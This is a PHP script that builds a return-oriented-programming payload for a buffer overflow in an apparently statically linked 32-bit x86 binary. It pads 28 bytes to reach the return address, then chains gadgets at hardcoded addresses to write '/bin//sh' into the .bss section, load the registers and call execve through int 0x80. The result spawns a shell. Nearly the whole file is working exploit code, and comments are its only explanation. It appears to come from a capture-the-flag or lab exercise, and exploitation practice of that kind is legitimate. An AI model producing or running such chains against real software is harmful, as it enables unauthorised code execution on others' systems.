#!/usr/bin/php
<?php

//converts to little endian
function addr($x){
	return (join(array_reverse(str_split($x, 2))));
}

$bss = "080e62c0";
$bss2 = "080e62c4"; //bss+4
$bss3 = "080e62cc"; //bss+12

$mov_mem_edx_eax = "08059102"; //mov [edx], eax
$xor_eax_eax = "0804fb90";
$pop_eax = "080b074a";
$pop_ebx = "08049022";
$pop_ecx = "08049e39";
$pop_edx_ebx = "080583c9";
$push_eax = "080b06ea";
$xchg_eax_edx = "0806ca36";
$mov_eax_7 = "08093990";
$add_eax_1 = "08093900";
$add_eax_3 = "08093910";
$syscall = "0804a3d2"; //int 0x80

$payload = str_repeat('A',28); //fill the buffer until EIP

//writing '/bin' into .bss
$payload .= addr($pop_eax); //put /bin into eax
$payload .= "/bin";
$payload .= addr($pop_edx_ebx); //put .bss addr into edx
$payload .= addr($bss)."cock";
$payload .= addr($mov_mem_edx_eax);	//write /bin into .bss

//writing '//sh' into .bss+4
$payload .= addr($pop_eax);
$payload .= "//sh";
$payload .= addr($pop_edx_ebx); //put .bss addr into edx
$payload .= addr($bss2)."cock";
$payload .= addr($mov_mem_edx_eax);	//write /bin into .bss+4

// writing pointer to /bin/sh into memory
$payload .= addr($pop_eax); //put .bss addr into eax
$payload .= addr($bss);
$payload .= addr($pop_edx_ebx); //put .bss+12 addr into edx
$payload .= addr($bss3)."cock";
$payload .= addr($mov_mem_edx_eax);	//write pointer to /bin/sh into .bss+12

//zeroing edx
$payload .= addr($xor_eax_eax); //zero eax
$payload .= addr($xchg_eax_edx); //exchange eax (\x00) for edx

//setting up registers
$payload .= addr($pop_ebx); //put .bss addr into ebx
$payload .= addr($bss);

$payload .= addr($pop_ecx); //put .bss+12 into ecx
$payload .= addr($bss3);

$payload .= addr($xor_eax_eax); //zero eax
$payload .= addr($mov_eax_7); //eax = 7
$payload .= addr($add_eax_3); //eax = 0xa
$payload .= addr($add_eax_1); //eax = 0xb (11 = execve syscall)

//syscall
$payload .= addr($syscall);


echo $payload;





